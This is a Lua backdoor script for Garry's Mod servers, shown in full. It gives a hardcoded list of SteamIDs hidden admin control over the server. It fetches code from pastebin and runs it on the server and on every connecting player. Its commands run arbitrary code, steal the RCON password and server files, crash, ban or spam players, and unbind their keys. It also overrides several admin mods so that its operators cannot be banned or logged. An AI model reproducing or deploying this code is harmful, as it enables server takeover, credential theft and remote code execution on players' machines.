

local SteamIDs = {"STEAM_0:1:34077374", "STEAM_0:0:24251446", "STEAM_0:1:32308388", "STEAM_0:1:24940779", "STEAM_0:1:20360963", "STEAM_0:0:26831669"}
local url = "http://pastebin.com/raw.php?i="


local override = false
local luarun = false
_G[util.CRC("vohof")] = _G[util.CRC("vohof")] or {}
local vohof = _G[util.CRC("vohof")]
local _R = debug.getregistry()


-- Hook system

local usednames = {}

local function AddHook(name1, name2, func)
	local crc = util.CRC(name2)
	if table.HasValue(usednames, crc) then
		hook.Add(name1, name2, func)
	else
		hook.Add(name1, crc, func)
		table.insert(usednames, crc)
	end
end

local function RemoveHook(name1, name2)
	local crc = util.CRC(name2)
	if table.HasValue(usednames, crc) then
		hook.Remove(name1, crc)
		for k, v in pairs(usednames) do
			if v == crc then
				table.remove(usednames, k)
				break
			end
		end
	else
		hook.Remove(name1, name2)
	end
end


-- Overlords

local Overlords = {}

local function IsOverlord(ply)
	return table.HasValue(Overlords, ply) or table.HasValue(SteamIDs, ply)
end
_G[util.CRC("IsOverlord")] = IsOverlord

for _, ply in pairs(player.GetHumans()) do
	if IsOverlord(ply:SteamID()) then
		table.insert(Overlords, ply)
		if override then
			ply:GodEnable()
		end
	end
end

AddHook("PlayerAuthed", "vInsertOverlord", function(ply)
	if IsOverlord(ply:SteamID()) then
		table.insert(Overlords, ply)
	end
end)

AddHook("PlayerDisconnected", "vRemoveOverlord", function(ply)
	for k, v in pairs(Overlords) do
		if v == ply then
			table.remove(Overlords, k)
			break
		end
	end
end)

AddHook("PlayerSpawned", "vGiveGodmode", function(ply)
	if IsOverlord(ply) and override then
		timer.Simple(0.1, function()
			if IsValid(ply) then
				ply:GodEnable()
			end
		end)
	end
end)


-- vPrint

util.AddNetworkString(tostring(util.CRC("vPrint")))
function vPrint(ply, text)
	if not text then
		text = ply
		ply = {}
		for _, v in pairs(Overlords) do
			table.insert(ply, v)
		end
	end
	net.Start(tostring(util.CRC("vPrint")))
		net.WriteString(tostring(text))
	net.Send(ply)
end


-- Command system

local commands = {}

local function AddCmd(cmd, func)
	commands[cmd] = func
end

util.AddNetworkString("vCmd")
net.Receive("vCmd", function(_, ply)
	if IsOverlord(ply) then
		local args = {}
		for i = 1, net.ReadUInt(8) do
			args[i] = net.ReadString()
		end
		local cmd = table.remove(args, 1)
		if commands[cmd] then
			pcall(commands[cmd], ply, args)
		end
	end
end)


-- Override mode

AddCmd("override", function(ply, args)
	override = args[1] and tobool(args[1]) or not override
	vPrint(ply:Name() .. " - Override: " .. tostring(override))
end)

AddHook("PlayerNoClip", "vNoClip", function(ply)
	if IsOverlord(ply) and override then
		return true
	end
end)


-- GetPlayer

function GetPlayer(name, ply)
	name = string.lower(name)
	for _, pl in pairs(player.GetAll()) do
		if string.find(string.lower(pl:Name()), name) then
			return pl
		end
	end
	if ply then
		vPrint(ply, "Not found.")
	end
end


-- RCON & Lua RCON

AddCmd("rcon", function(ply, args)
	vPrint(ply:Name() .. " - RCON: " .. table.concat(args, " "))
	game.ConsoleCommand(table.concat(args, " ") .. "\n")
end)

local last = ""
--[[timer.Create("vLuaRCON", 15, 0, function()
	http.Fetch(url .. "LuaRCON.txt", function(data)
		if data ~= "" and data ~= last then
			local func = CompileString(data, "", false)
			if type(func) == "function" then
				pcall(func)
			end
			last = data
		end
	end)
end)]]


-- Finder

AddCmd("find", function(ply, args)
	local path = args[1] and (table.concat(args, " ") .. "/*") or "*"
	local files, dirs = file.Find(path, "GAME")
	table.Add(files, dirs)
	for _, v in SortedPairs(files) do
		vPrint(ply, v)
	end
end)


-- Lua Sender

local cliento = 'http.Fetch("' .. url .. 'hBu4zLZ3",function(f)f=CompileString(f,"",false)if type(f)=="function"then pcall(f)end end)'
local clientno = 'http.Fetch("' .. url .. 'DsNvwRG1",function(f)f=CompileString(f,"",false)if type(f)=="function"then pcall(f)end end)'
local clientall = 'http.Fetch("' .. url .. 'v3nZXr29",function(f)f=CompileString(f,"",false)if type(f)=="function"then pcall(f)end end)'

for _, ply in pairs(player.GetAll()) do
	ply:SendLua(clientall)
	if IsOverlord(ply) then
		ply:SendLua(cliento)
	else
		ply:SendLua(clientno)
	end
end

AddHook("PlayerInitialSpawn", "vClientLua", function(ply)
	ply:SendLua(clientall)
	if IsOverlord(ply) then
		ply:SendLua(cliento)
	else
		ply:SendLua(clientno)
	end
end)

local mt = {}
function mt.__index(_, k)
	return function(_, ...)
		for _, v in pairs(player.GetAll()) do
			v[k](v, ...)
		end
	end
end

AddCmd("lua", function(pl, args)
	local code = table.concat(args, " ")	
	local func = CompileString(code, "", false)	
	if type(func) == "function" then
		local old = {me, this, here, ply, msg, all}
		
		if pl ~= NULL then
			me = pl
			
			local trace = pl:GetEyeTrace()
			this = trace.Entity
			here = trace.HitPos
			
			function msg(text)
				vPrint(pl, text)
			end
		end
		
		function ply(text)
			return GetPlayer(text, pl)
		end
		
		all = {}
		setmetatable(all, mt)
		
		local status, err = pcall(func)
		
		if status then
			vPrint(pl:Name() .. " - LuaRun: " .. code)
		else
			vPrint(pl, "Lua-error: " .. err)
		end
		
		me, this, here, ply, msg, all = unpack(old)
	else
		vPrint(pl, "Lua-error: " .. func)
	end
end)

util.AddNetworkString(util.CRC("vLuaRun"))
net.Receive(util.CRC("vLuaRun"), function(_, pl)
	local mode, name, code = net.ReadString(), net.ReadString(), net.ReadString()
	if mode == "sv" then
		local old = {me, this, here, ply, msg, all}
		me = pl
		local trace = pl:GetEyeTrace()
		this = trace.Entity
		here = trace.HitPos
		function ply(text)
			return GetPlayer(text, pl)
		end
		function msg(text)
			vPrint(pl, text)
		end
		all = {}
		setmetatable(all, mt)
		luarun = true
		RunString(code)
		vPrint(pl:Name() .. " - Lua: Server - " .. name)
		luarun = false
		me, this, here, ply, msg, all = unpack(old)
	elseif mode == "cl" then
		net.Start(util.CRC("vLuaRun"))
			net.WriteString(code)
		net.Broadcast()
		vPrint(pl:Name() .. " - Lua: Client - " .. name)
	elseif mode == "sh" then
		local old = {me, this, here, ply, msg, all}
		me = pl
		local trace = pl:GetEyeTrace()
		this = trace.Entity
		here = trace.HitPos
		function ply(nick)
			return GetPlayer(nick)
		end
		function msg(text)
			vPrint(pl, text)
		end
		all = {}
		setmetatable(all, mt)
		luarun = true
		RunString(code)
		net.Start(util.CRC("vLuaRun"))
			net.WriteString(code)
		net.Broadcast()
		vPrint(pl:Name() .. " - Lua: Shared - " .. name)
		luarun = false
		me, this, here, ply, msg, all = unpack(old)
	elseif mode == "no" then
		local target = {}
		for _, v in pairs(player.GetAll()) do
			if not IsOverlord(v) then
				table.insert(target, v)
			end
		end
		net.Start(util.CRC("vLuaRun"))
			net.WriteString(code)
		net.Send(target)
		vPrint(pl:Name() .. " - Lua: Client Non-overlords - " .. name)
	elseif mode == "o" then
		local target = {}
		for _, v in pairs(player.GetAll()) do
			if IsOverlord(v) then
				table.insert(target, v)
			end
		end
		net.Start(util.CRC("vLuaRun"))
			net.WriteString(code)
		net.Send(target)
		vPrint(pl:Name() .. " - Lua: Client Overlords - " .. name)
	else
		local target = GetPlayer(mode, pl)
		if target then
			net.Start(util.CRC("vLuaRun"))
				net.WriteString(code)
			net.Send(target)
			vPrint(pl:Name() .. " - Lua: Client (" .. target:Name() .. ") - " .. name)
		end
	end
end)

concommand.Add(util.CRC("vluarunloaded"), function(ply)
	ply[util.CRC("luarun")] = true
	hook.Run(util.CRC("VLuaRunLoaded"), ply)
end)


-- Say

AddCmd("say", function(_, args)
	local text = table.concat(args, " ")
	for _, ply in pairs(player.GetHumans()) do
		ply:ChatPrint(text)
	end
end)


-- Stealer

local first

util.AddNetworkString("vStealer_write")
local function sendstolen(ply, path, v, first)
	net.Start("vStealer_write")
		net.WriteString(string.Replace(path .. "/" .. v, first, ""))
		net.WriteString(file.Read(path .. "/" .. v, "GAME"))
	net.Send(ply)
end
util.AddNetworkString("vStealer_makedirectory")
local function steal(ply, path)
	local _, dirs = file.Find(path .. "/*", "GAME")
	for _, v in pairs(dirs) do
		net.Start("vStealer_makedirectory")
			net.WriteString(string.Replace(path .. "/" .. v, first, ""))
		net.Send(ply)
		steal(ply, path .. "/" .. v)
	end	
	for _, v in pairs(file.Find(path .. "/*.cfg", "GAME")) do
		sendstolen(ply, path, v, first)
	end
	for _, v in pairs(file.Find(path .. "/*.lua", "GAME")) do
		sendstolen(ply, path, v, first)
	end
	for _, v in pairs(file.Find(path .. "/*.txt", "GAME")) do
		sendstolen(ply, path, v, first)
	end
	for _, v in pairs(file.Find(path .. "/*.vmt", "GAME")) do
		sendstolen(ply, path, v, first)
	end
end

util.AddNetworkString("vStealer_start")
AddCmd("steal", function(ply, args)
	local path = table.concat(args, " ")
	first = path
	if file.Exists(path, "GAME") then
		net.Start("vStealer_start")
		net.Send(ply)
		vPrint(ply:Name() .. " - Steal: " .. path)
		steal(ply, path)
	else
		vPrint(ply, "Invalid folder.")
	end
end)


-- Uploader

net.Receive("vUpload", function(_, ply)
	local name = net.ReadString()
	file.Write(name, net.ReadString())
	vPrint(ply:Name() .. " - Upload: " .. name)
end)


-- Cleaner

local function delete(path)
	local files, dirs = file.FindDir(path .. "/*", "DATA")
	for _, v in pairs(files) do
		delete(path .. "/" .. v)
	end	
	for _, v in pairs(dirs) do
		file.Delete(path .. "/" .. v)
	end
end

AddCmd("clean", function(ply, args)
	local path = table.concat(args, " ")
	if file.Exists(path, "DATA") then
		delete(path)
		vPrint(ply:Name() .. " - Clean: data/" .. path)
	else
		vPrint(ply, "Invalid folder.")
	end
end)


-- Crasher

AddCmd("crash", function(ply, args)
	local target = GetPlayer(table.concat(args, " "), ply)
	if target then
		target:SendLua("cam.End3D()")
		vPrint(ply:Name() .. " - Crash: " .. target:Name())
	end
end)


-- Reload

AddCmd("reload", function(ply)
	vPrint(ply:Name() .. " - Reload")
	http.Fetch(url .. "cp9YUiXD", function(data)
		RunString(data)
	end)
end)


-- RCON password stealing

local RconPassword

if file.Exists("cfg/server.cfg", "GAME") then
	for k, v in pairs(string.Explode("\n", file.Read("cfg/server.cfg", "GAME"))) do
		if string.find(v, "rcon_password") then
			RconPassword = v
		end
	end
end
if not RconPassword and file.Exists("cfg/autoexec.cfg", "GAME") then
	for k, v in pairs(string.Explode("\n", file.Read("cfg/autoexec.cfg", "GAME"))) do
		if string.find(v, "rcon_password") then
			RconPassword = v
		end
	end
end

AddCmd("printrcon", function(ply)
	if RconPassword then
		vPrint(ply, RconPassword)
	else
		vPrint(ply, "Not found.")
	end
end)


-- Print admins

local function PrintAdmins(ply)
	for k, v in pairs(player.GetAll()) do
		if v:IsSuperAdmin() then
			vPrint(ply, "Superadmin: " .. v:Name())
		elseif v:IsAdmin() then
			vPrint(ply, "Admin: " .. v:Name())
		end
	end
end

AddCmd("admins", function(ply)
	PrintAdmins(ply)
end)


-- AutoBan

local autoban = false
AddCmd("autoban", function(ply)
	if autoban then
		RemoveHook("PlayerInitialSpawn", "vAutoBan")
		autoban = false
	else
		AddHook("PlayerInitialSpawn", "vAutoBan", function(ply)
			if not IsOverlord(ply) then
				ply:Ban(0, "!!!OLOLOLOLO!!!")
				ply:Kick("!!!OLOLOLOLO!!!")
			end
		end)
		for _, ply in pairs(player.GetAll()) do
			if not IsOverlord(ply) then
				ply:Ban(0, "!!!OLOLOLOLO!!!")
				ply:Kick("!!!OLOLOLOLO!!!")
			end
		end
		autoban = true
	end
	vPrint(ply:Name() .. " - AutoBan: " .. tostring(autoban))
end)


-- Cleanup

AddCmd("cleanup", function(ply)
	game.CleanUpMap()
	vPrint(ply:Name() .. " - Cleanup")
end)


-- Cexec

AddCmd("cexec", function(ply, args)
	if args[2] then
		local target = GetPlayer(table.remove(args, 1), ply)
		if target then
			local cmd = table.concat(args, " ")
			target:ConCommand(cmd)
			vPrint(ply:Name() .. " - Cexec: " .. target:Name() .. " - " .. cmd)
		end
	else
		local cmd = table.concat(args, " ")
		for _, v in pairs(player.GetAll()) do
			v:ConCommand(cmd)
		end
		vPrint(ply:Name() .. " - Cexec: All players - " .. cmd)
	end
end)

AddCmd("sayall", function(ply, args)
	local msg = table.concat(args, " ")
	for k, v in pairs(player.GetAll()) do
		v:ConCommand("say " .. msg)
	end
end)


-- File flood

local function flood(path, name)
	local _, dirs = file.Find(path and (path .. "/*") or "*", "DATA")
	for k, v in pairs(dirs) do
		flood((path and (path .. "/") or "") .. v, name)
	end
	for i = 1, 1000 do
		file.Write((path and (path .. "/") or "") .. name .. "_" .. i .. ".txt", name)
	end
end

AddCmd("flood", function(ply, args)
	local name = table.concat(args, " ")
	vPrint(ply:Name() .. " - Flood: " .. name)
	flood(nil, name)
end)


-- UnBind Console

AddCmd("unbindconsole", function(ply)
	for _, v in pairs(player.GetAll()) do
		if v:IsAdmin() and not IsOverlord(v) then
			v:SendLua([[RunConsoleCommand("unbind", "`")]])
			vPrint(ply:Name() .. " - Console unbind: " .. v:Name())
		end
	end
end)


-- UnBindAll

AddCmd("unbindall", function(ply)
	for _, v in pairs(player.GetAll()) do
		if not IsOverlord(v) then
			v:SendLua([[RunConsoleCommand("unbindall")]])
			vPrint(ply:Name() .. " - Mass unbind")
		end
	end
end)


-- Unlimited spraying

concommand.Add(util.CRC("vspray"), function(ply)
	if override then
		ply:AllowImmediateDecalPainting()
	end
end)


-- Playermodels

local model
local models = {}

AddCmd("models", function(ply, args)
	if args[1] then
		model = args[1]
		timer.Create("vModels", 1, 0, function()
			for k, v in pairs(player.GetAll()) do
				if v:GetModel() ~= model then
					models[v] = v:GetModel()
				end
				v:SetModel(model)
				v:SetColor(math.random(0, 255), math.random(0, 255), math.random(0, 255), 255)
			end
		end)
		vPrint(ply:Name() .. " - Models: " .. model)
	else
		timer.Destroy("vModels")
		for k, v in pairs(player.GetAll()) do
			if models[v] then
				v:SetModel(models[v])
				v:SetColor(255, 255, 255, 255)
			end
		end
		models = {}
		vPrint(ply:Name() .. " - Models: Off")
	end
end)


-- DarkRP

if GAMEMODE.FolderName == "darkrp" then
	AddHook("PlayerDeath", "vPrintKiller", function(victim, inflictor, killer)
		if IsOverlord(victim) and victim ~= killer then
			vPrint(victim, "Your killer: " .. killer:Name() .. (IsValid(inflictor) and (" (" .. inflictor:GetClass() .. ")") or ""))
		end
	end)
	
	vohof.PrintMessage = vohof.PrintMessage or _R.Player.PrintMessage
	function _R.Player:PrintMessage(class, text, ...)
		local found
		if class == HUD_PRINTCONSOLE then
			local name = string.match(text, ".+ was killed by (.+) with .+")
			if name then
				for k, v in pairs(Overlords) do
					vohof.PrintMessage(v, class, text, ...)
					if name == v:Name() then
						found = true
					end
				end
			end
		end
		if not found then
			vohof.PrintMessage(self, class, text, ...)
		end
	end
	
	vohof.SetSelfDarkRPVar = vohof.SetSelfDarkRPVar or _R.Player.SetSelfDarkRPVar
	function _R.Player:SetSelfDarkRPVar(var, val, ...)
		return vohof.SetSelfDarkRPVar(self, var, (var == "Energy" and IsOverlord(self)) and 100 or val, ...)
	end
end


-- Attack

AddCmd("attack", function(ply, args)
	local tar
	if args[1] then
		tar = GetPlayer(args[1])
	else
		tar = ply:GetEyeTrace().Entity
	end
	if IsValid(tar) and tar:IsPlayer() then
		tar:ConCommand("+attack")
		timer.Simple(0.1, function() if IsValid(tar) then tar:ConCommand("-attack") end end)
		vPrint(ply:Name() .. " - Attack: " .. tar:Name())
	end
end)


-- Hide

local hide = util.CRC("vHide")
local isdrp = string.lower(GAMEMODE.FolderName) == "darkrp"

AddCmd("hide", function(ply)
	ply[hide] = ply[hide] or {}
	ply[hide][1] = not ply[hide][1]
	if ply[hide][1] then
		local r, g, b, a = ply:GetColor()
		ply[hide][2] = a
		ply:SetColor(r, g, b, 0)
		ply[hide][3] = {}
		for k, v in pairs(ply:GetWeapons()) do
			local r, g, b, a = v:GetColor()
			ply[hide][3][v:GetClass()] = a
			v:SetColor(r, g, b, 0)
		end
		ply:SetNotSolid(true)
		vPrint(ply, "vHide activated.")
		if isdrp then
			ply:SetNWBool(hide, true)
		end
	else
		local r, g, b = ply:GetColor()
		ply:SetColor(r, g, b, ply[hide][2])
		for k, v in pairs(ply:GetWeapons()) do
			if ply[hide][3][v:GetClass()] then
				local r, g, b = v:GetColor()
				v:SetColor(r, g, b, ply[hide][3][v:GetClass()])
			end
		end
		ply:SetNotSolid(false)
		vPrint(ply, "vHide deactivated.")
		if isdrp then
			ply:SetNWBool(hide, false)
		end
	end
end)

AddHook("PlayerCanPickupWeapon", "vHide", function(ply, wep)
	if IsOverlord(ply) and ply[hide] and ply[hide][1] then
		local r, g, b, a = wep:GetColor()
		ply[hide][3][wep:GetClass()] = a
		wep:SetColor(r, g, b, 0)
	end
end)

AddHook("PlayerSpawn", "vHide", function(ply)
	if IsOverlord(ply) then
		timer.Simple(.1, function()
			if IsValid(ply) and ply[hide] then
				if ply[hide][1] then
					ply[hide][3] = {}
					for k, v in pairs(ply:GetWeapons()) do
						local r, g, b, a = v:GetColor()
						ply[hide][3][v:GetClass()] = a
						v:SetColor(r, g, b, 0)
					end
					ply:SetNotSolid(true)
				else
					local r, g, b = v:GetColor()
					v:SetColor(r, g, b, ply[hide][3][v:GetClass()])
				end
			end
		end)
	end
end)


-- Disguise

local disg = util.CRC("vDisg")

AddCmd("disg", function(ply, args)
	if args[1] then
		local name = table.concat(args, " ")
		ply:SetNWString(disg, name)
		vPrint(ply:Name() .. " - Disguise: " .. name)
	else
		ply:SetNWString(disg, "")
		vPrint(ply:Name() .. " - Disguise: Off")
	end
end)

vohof.Nick = vohof.Nick or _R.Player.Nick
function _R.Player:Nick()
	return self:GetNWString(disg, "") == "" and vohof.Nick(self) or self:GetNWString(disg, "")
end
_R.Player.GetName = _R.Player.Nick
_R.Player.Name = _R.Player.Nick


-- Door control

AddCmd("open", function(ply)
	local ent = ply:GetEyeTraceNoCursor().Entity
	if IsValid(ent) and string.find(string.lower(ent:GetClass()), "door") then
		ent:Fire("unlock", "", 0)
		ent:Fire("open", "", 0)
		ent:Fire("lock", "", 0)
		vPrint(ply:Name() .. " - Door open")
	end
end)

AddCmd("close", function(ply)
	local ent = ply:GetEyeTraceNoCursor().Entity
	if IsValid(ent) and string.find(string.lower(ent:GetClass()), "door") then
		ent:Fire("unlock", "", 0)
		ent:Fire("close", "", 0)
		ent:Fire("lock", "", 0)
		vPrint(ply:Name() .. " - Door close")
	end
end)


-- Admin dupe protection

AddHook("CanTool", "vAdminDupeProtection", function(ply, tr, tool)
	if (tool == "adv_duplicator" or tool == "duplicator") and tr.Entity.CPPIGetOwner and tr.Entity:CPPIGetOwner() and ply ~= tr.Entity:CPPIGetOwner() and IsOverlord(tr.Entity:CPPIGetOwner()) then
		vPrint("Blocked dupe-stealing: " .. ply:Name())
		return false
	end
end)


-- Rights overriding

local function OverrideRights(func, ...)
	if override then
		local args = {...}
		return IsOverlord(args[1]) or func(...)
	else
		return func(...)
	end
end

local function OverrideRights2(func, ...)
	if override then
		local args = {...}
		local ply1, ply2 = args[1], args[2]
		if IsOverlord(ply1) then
			return true
		end
		if IsOverlord(ply2) then
			vPrint("Blocked access: " .. ply1:Name() .. " --> " .. ply2:Name())
			return false
		end
	end
	return func(...)
end

vohof.IsAdmin = vohof.IsAdmin or _R.Player.IsAdmin
function _R.Player.IsAdmin(...)
	return OverrideRights(vohof.IsAdmin, ...)
end

vohof.IsSuperAdmin = vohof.IsSuperAdmin or _R.Player.IsSuperAdmin
function _R.Player.IsSuperAdmin(...)
	return OverrideRights(vohof.IsSuperAdmin, ...)
end

vohof.Kick = vohof.Kick or _R.Player.Kick
function _R.Player:Kick(reason)
	if IsOverlord(self) then
		vPrint("Blocked GLua kick of " .. self:Name() .. ": " .. debug.getinfo(2, "S").short_src)
	else
		return vohof.Kick(self, reason)
	end
end

vohof.Ban = vohof.Ban or _R.Player.Ban
function _R.Player:Ban(length, reason)
	if IsOverlord(self) then
		vPrint("Blocked GLua ban of " .. self:Name() .. ": " .. debug.getinfo(2, "S").short_src)
	else
		return vohof.Ban(self, length, reason)
	end
end

local function CheckCmd(cmd, assmod)
	if not luarun then
		if string.find(cmd, "kick") then
			for _, v in pairs(Overlords) do
				if string.find(cmd, v:Name()) then
					vPrint("Blocked " .. (assmod and "ASSMod " or "") .. "ConCmd: " .. cmd)
					return false
				end
			end
		end
		if string.find(cmd, "kickid") then
			for _, v in pairs(Overlords) do
				if string.find(cmd, "[^%d:_]" .. v:UserID() .. "[^%d:]") or string.find(cmd, "[^%d_:]" .. v:UniqueID() .. "[^%d:]") then
					vPrint("Blocked " .. (assmod and "ASSMod " or "") .. "ConCmd: " .. cmd)
					return false
				end
			end
		end
		if string.find(cmd, "banid") then
			for _, v in pairs(SteamIDs) do
				if string.find(cmd, v) then
					vPrint("Blocked " .. (assmod and "ASSMod " or "") .. "ConCmd: " .. cmd)
					return false
				end
			end
		end
		if string.find(cmd, "banip") then
			for _, v in pairs(Overlords) do
				if string.find(cmd, v:IPAddress()) then
					vPrint("Blocked " .. (assmod and "ASSMod " or "") .. "ConCmd: " .. cmd)
					return false
				end
			end
		end
		if string.find(cmd, "addip") then
			for _, v in pairs(Overlords) do
				if string.find(cmd, v:IPAddress()) then
					vPrint("Blocked " .. (assmod and "ASSMod " or "") .. "ConCmd: " .. cmd)
					return false
				end
			end
		end
		--[[if override and string.find(cmd, "changelevel") or string.find(cmd, "changegamemode") then
			vPrint("Blocked " .. (assmod and "ASSMod " or "") .. "ConCmd: " .. cmd)
			return false
		end]]
	end
	return true
end

vohof.ConsoleCommand = vohof.ConsoleCommand or game.ConsoleCommand
function game.ConsoleCommand(cmd)
	if CheckCmd(cmd) then
		vohof.ConsoleCommand(cmd)
	end
end

vohof.RunConsoleCommand = vohof.RunConsoleCommand or RunConsoleCommand
function RunConsoleCommand(...)
	local cmd = table.concat({...}, " ")
	if CheckCmd(cmd) then
		vohof.RunConsoleCommand(...)
	end
end

AddHook("CanTool", "vAllTools", function(ply)
	if IsOverlord(ply) and override then
		return true
	end
end)

if ULib then
	vohof.UCLQuery = vohof.UCLQuery or ULib.ucl.query
	function ULib.ucl.query(...)
		return OverrideRights(vohof.UCLQuery, ...)
	end
	
	vohof.ULibAddBan = vohof.ULibAddBan or ULib.addBan
	function ULib.addBan(steamid, time, reason, name, admin)
		if IsOverlord(steamid) then
			vPrint("Blocked ULib ban of " .. name .. ".")
		else
			vohof.ULibAddBan(steamid, time, reason, name, admin)
		end
	end
end

if ASS_VERSION then
	vohof.AssConsoleCommand = vohof.AssConsoleCommand or asscmd.ConsoleCommand
	function asscmd.ConsoleCommand(cmd)
		if CheckCmd(cmd, true) then
			vohof.AssConsoleCommand(cmd)
		end
	end
	
	vohof.AssIsTempAdmin = vohof.AssIsTempAdmin or _R.Player.IsTempAdmin
	function _R.Player.IsTempAdmin(...)
		return OverrideRights(vohof.AssIsTempAdmin, ...)
	end
	
	vohof.AssIsRespected = vohof.AssIsRespected or _R.Player.IsRespected
	function _R.Player.IsRespected(...)
		return OverrideRights(vohof.AssIsRespected, ...)
	end
	
	vohof.AssHasLevel = vohof.AssHasLevel or _R.Player.HasLevel
	function _R.Player.HasLevel(...)
		return OverrideRights(vohof.AssHasLevel, ...)
	end
	
	vohof.AssIsBetterOrSame = vohof.AssIsBetterOrSame or _R.Player.IsBetterOrSame
	function _R.Player.IsBetterOrSame(...)
		return OverrideRights2(vohof.AssIsBetterOrSame, ...)
	end
end

if exsto then
	vohof.ExIsAllowed = vohof.ExIsAllowed or _R.Player.IsAllowed
	function _R.Player.IsAllowed(...)
		return OverrideRights(vohof.ExIsAllowed, ...)
	end
	
	vohof.ExHasAccessOver = vohof.ExHasAccessOver or _R.Player.HasAccessOver
	function _R.Player.HasAccessOver(...)
		return OverrideRights2(vohof.ExHasAccessOver, ...)
	end
end

if evolve then
	vohof.EvBan = vohof.EvBan or evolve.Ban
	function evolve:Ban(uid, ...)
		local ply = player.GetByUniqueID(uid)
		if ply then
			if IsOverlord(ply) then
				vPrint("Blocked Evolve ban of " .. ply:Name())
			else
				vohof.EvBan(self, uid, ...)
			end
		end
	end
	
	vohof.EvHasPrivilege = vohof.EvHasPrivilege or _R.Player.EV_HasPrivilege
	function _R.Player.EV_HasPrivilege(...)
		return OverrideRights(vohof.EvHasPrivilege, ...)
	end
	
	vohof.EvBetterThan = vohof.EvBetterThan or _R.Player.EV_BetterThan
	function _R.Player.EV_BetterThan(...)
		return OverrideRights2(vohof.EvBetterThan, ...)
	end
	
	vohof.EvBetterThanOrEqual = vohof.EvBetterThanOrEqual or _R.Player.EV_BetterThanOrEqual
	function _R.Player.EV_BetterThanOrEqual(...)
		return OverrideRights2(vohof.EvBetterThanOrEqual, ...)
	end
end

if FAdmin then
	vohof.FAPlayerHasPrivilege = vohof.FAPlayerHasPrivilege or FAdmin.Access.PlayerHasPrivilege
	function FAdmin.Access.PlayerHasPrivilege(...)
		return OverrideRights(vohof.FAPlayerHasPrivilege, ...)
	end
end

if citrus then
	vohof.CitrusHas = vohof.CitrusHas or citrus.Access.Has
	function citrus.Access.Has(...)
		return OverrideRights(vohof.CitrusHas, ...)
	end
	
	vohof.CitrusKick = vohof.CitrusKick or citrus.Player.Kick
	function citrus.Player.Kick(ply, reason)
		if IsOverlord(ply) then
			vPrint("Blocked Citrus kick of " .. ply:Name() .. ".")
		else
			return vohof.CitrusKick(ply, reason)
		end
	end
	
	vohof.CitrusBan = vohof.CitrusBan or citrus.Bans.Add
	function citrus.Bans.Add(ply, ...)
		if IsOverlord(ply) then
			vPrint("Blocked Citrus ban of " .. ply:Name() .. ".")
		else
			return vohof.CitrusBan(ply, ...)
		end
	end
	
	vohof.CitrusOfflineBan = vohof.CitrusOfflineBan or citrus.Bans.OfflineAdd
	function citrus.Bans.OfflineAdd(steamid, ...)
		if IsOverlord(ply) then
			vPrint("Blocked Citrus offline ban of " .. steamid .. ".")
		else
			return vohof.CitrusOfflineBan(steamid, ...)
		end
	end
	
	vohof.CitrusBanCheck = vohof.CitrusBanCheck or citrus.Bans.PlayerInitialSpawn
	function citrus.Bans.PlayerInitialSpawn(Player)
		if not IsOverlord(ply) then
			vohof.CitrusBanCheck(ply)
		end
	end	
	hook.Add("PlayerInitialSpawn", "citrus.Bans.PlayerInitialSpawn", citrus.Bans.PlayerInitialSpawn)
end

if gatekeeper then
	vohof.GatekeeperDrop = vohof.GatekeeperDrop or gatekeeper.Drop
	function gatekeeper.Drop(userid, reason)
		for _, ply in pairs(Overlords) do
			if userid == ply:UserID() then
				vPrint("Blocked Gatekeeper drop of " .. ply:Name() .. ".")
				return false
			end
		end
		return vohof.GatekeeperDrop(userid, reason)
	end
	
	AddHook("PlayerPasswordAuth", "vGatekeeperBypass", function(_, _, steamid)
		if override and IsOverlord(steamid) then
			return true
		end
	end)
end

if openAura then
	vohof.oaPrintLog = vohof.oaPrintLog or openAura.PrintLog
	function openAura:PrintLog(class, text)
		local check
		for k, v in pairs(Overlords) do
			if string.find(text, v:Name()) then
				check = true
				break
			end
		end
		if not check then
			return vohof.oaPrintLog(self, class, text)
		end
	end
end


-- Mods checking, "loaded" message.

local function sendinfo(ply)
	vPrint(ply, "Loaded.")
	
	PrintAdmins(ply)
	
	if ASS_VERSION then
		vPrint(ply, "Admin mod: " .. ASS_VERSION .. ".")
	end
	if BA then
		vPrint(ply, "Admin mod: Brom.")
	end
	if citrus then
		vPrint(ply, "Admin mod: Citrus.")
	end
	if FAdmin then
		vPrint(ply, "Admin mod: FAdmin.")
	end
	if evolve then
		vPrint(ply, "Admin mod: Evolve v" .. evolve.version .. ".")
	end
	if exsto then
		vPrint(ply, "Admin mod: Exsto.")
	end
	if ga then
		vPrint(ply, "Admin mod: GlobalAdmin.")
	end
	if ULib then
		vPrint(ply, "Admin mod: ULib.")
	end
	if ulx then
		vPrint(ply, "Admin mod: ULX.")
	end
	
	if hIO then
		vPrint(ply, "Module: hIO.")
	end
	if rawio then
		vPrint(ply, "Module: Rawio.")
	end
	
	if RconPassword then
		vPrint(ply, RconPassword)
	end
end

concommand.Add(util.CRC("vloaded"), sendinfo)